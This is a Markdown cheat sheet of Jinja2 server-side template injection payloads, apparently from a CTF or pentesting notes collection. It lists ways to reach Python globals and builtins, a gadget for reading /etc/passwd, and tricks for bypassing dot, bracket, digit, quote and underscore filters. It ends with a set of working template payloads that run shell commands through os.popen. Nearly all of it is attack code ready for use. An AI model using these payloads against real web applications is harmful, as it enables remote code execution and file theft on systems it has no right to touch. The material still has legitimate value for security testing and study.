# Jinja 2

See the [pyjail cheatsheet](./pyjail.md).

## Building blocks

### Getting object
```py
>>> range.__base__
>>> [].__class__.__base__
>>> ().__class__.mro()[1]
>>> {}.__class__.__mro__[1]
```

### Some useful classes
```py
# 40: File
>>> object.__subclasses__()[40]('/etc/passwd').read()
# 84: Builtin Importer
>>> object.__subclasses__()[84].load_module('builtins')
```

### Accessing globals (jinja module)
```py
>>> lipsum.__globals__
>>> url_for.__globals__
>>> cycler.__init__.__globals__
>>> joiner.__init__.__globals__
>>> namespace.__init__.__globals__
```

### Accessing builtins
```py
>>> globals().__builtins__
>>> object.__subclasses__()[84].load_module('builtins')
```

## Bypassing filters

### Dot filter
```py
>>> lipsum["__globals__"]
>>> lipsum|attr("__globals__")
```

### Bracket filter
```py
>>> lipsum.__globals__.os
>>> lipsum|attr("__globals__").os
```

### Digit filter
```py
>>> _|int
0
>>> "6"|int
>>> "6"|float
>>> False # looks like 0
>>> True  # looks like 1
>>> {x,x,x}|length # works even when x is undefined
3
>>> range~lipsum|length
64
```

### Boolean filter
```py
# False
>>> 0, '', [], (), {}, set(), None, Undefined, range(0) # Falsy
>>> 0>0
>>> ()>()
>>> ''<''
>>> x!=x # works even when x is undefined
>>> 0is 1
>>> 0in[]

# True
>>> 7, -7, 'A', [0], {0}, (0,), {0:0}, range(1), object() # Truthy
>>> 1>0
>>> x==x # works even when x is undefined
>>> 'a'>''
>>> ''in''
>>> ''==''
```

### Constructing strings without quotes
```py
>>> dict(__class__=_)|last
"__class__"
>>> dict(__class__=_)|first
"__class__"
>>> range~False
"<class 'range'>False"
>>> _|pprint
"Undefined"
>>> 5|string
"5"
>>> (_~range)[True:([]~True)|length]
"class"
```

## Common payloads

### No bracket, no digit.
Very short!
```py
{{ lipsum.__globals__.os.popen('id').read() }}
```

### No dot, no digit.
Very short!
```py
{{ lipsum['__globals__']['os']['popen']('id')['read']() }}
```

### No dot, no bracket, no digit.
```py
{{ lipsum|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}
```

### No dot, no bracket, no underscore.
Optimized from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass).
```py
{{ lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

### No dot, no quote, no digit.
```py
{{ lipsum[dict(__globals__=_)|last][dict(os=_)|last][dict(popen=_)|last](dict(ls=_)|last)[dict(read=_)|last]() }}
```

### No dot, no bracket, no quote, no digit.
```py
{{ lipsum|attr(dict(__globals__=_)|last)|attr(dict(get=_)|last)(dict(os=_)|last)|attr(dict(popen=_)|last)(dict(id=_)|last)|attr(dict(read=_)|last)() }}
```